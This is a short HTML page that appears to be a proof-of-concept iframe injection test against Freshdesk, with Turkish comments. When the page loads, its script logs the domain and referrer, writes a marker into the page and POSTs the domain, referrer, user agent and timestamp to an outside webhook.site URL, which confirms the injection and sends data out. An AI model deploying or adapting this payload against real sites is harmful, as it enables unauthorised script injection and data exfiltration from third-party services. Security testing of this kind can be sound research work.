<!DOCTYPE html>
<html>
<body style="background:red;">
    <h1>IFRAME TEST g</h1>
    <script>
        console.log('=== IFRAME JAVASCRIPT ACTIVE ===');
        console.log('Domain:', document.domain);
        console.log('Referrer:', document.referrer);
        
        // DOM'a bilgi ekle
        document.body.innerHTML += '<p style="color:white;">JS WORKING: ' + new Date() + '</p>';
        
        // Webhook'a JSON payload gÃ¶nder
        fetch('https://webhook.site/702e64e6-a3b1-4c90-b2ff-d53f3db32498', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                test: 'freshdesk_iframe_injection',
                domain: document.domain,
                referrer: document.referrer,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                success: true
            })
        }).then(() => {
            console.log('Webhook payload sent successfully');
        }).catch(e => {
            console.log('Webhook error:', e);
        });
    </script>
</body>
</html>
